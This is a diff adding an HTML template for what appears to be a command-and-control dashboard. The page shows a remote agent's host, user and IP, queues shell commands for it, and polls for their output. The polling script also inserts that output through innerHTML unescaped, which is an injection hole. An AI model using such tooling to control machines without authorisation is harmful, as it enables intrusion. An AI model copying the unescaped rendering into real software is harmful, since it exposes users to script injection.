@@ -1,0 +1,32 @@
+{% extends "base.html" %}
+{% block content %}
+<h2>Agent {{ agent.hostname }} ({{ agent.uid[:8] }}…)</h2>
+<p>OS: {{ agent.os_info }} | User: {{ agent.username }} | IP: {{ agent.ip_address }}</p>
+
+<form method="post" action="{{ url_for('dash.issue_task', uid=agent.uid) }}">
+  <input name="command" placeholder="command (e.g. whoami)" size="60" required>
+  <button>Queue</button>
+</form>
+
+<table id="tasks">
+  <tr><th>ID</th><th>Command</th><th>Status</th><th>Output</th></tr>
+  {% for t in tasks %}
+  <tr>
+    <td>{{ t.id }}</td>
+    <td>{{ t.command }}</td>
+    <td>{{ t.status }}</td>
+    <td><pre>{{ t.output or "" }}</pre></td>
+  </tr>
+  {% endfor %}
+</table>
+
+<script>
+setInterval(async () => {
+  const r = await fetch("{{ url_for('dash.poll_tasks', uid=agent.uid) }}");
+  const rows = await r.json();
+  const tbody = document.getElementById('tasks');
+  tbody.innerHTML = '<tr><th>ID</th><th>Command</th><th>Status</th><th>Output</th></tr>' +
+    rows.map(t => `<tr><td>${t.id}</td><td>${t.command}</td><td>${t.status}</td><td><pre>${t.output || ''}</pre></td></tr>`).join('');
+}, 4000);
+</script>
+{% endblock %}
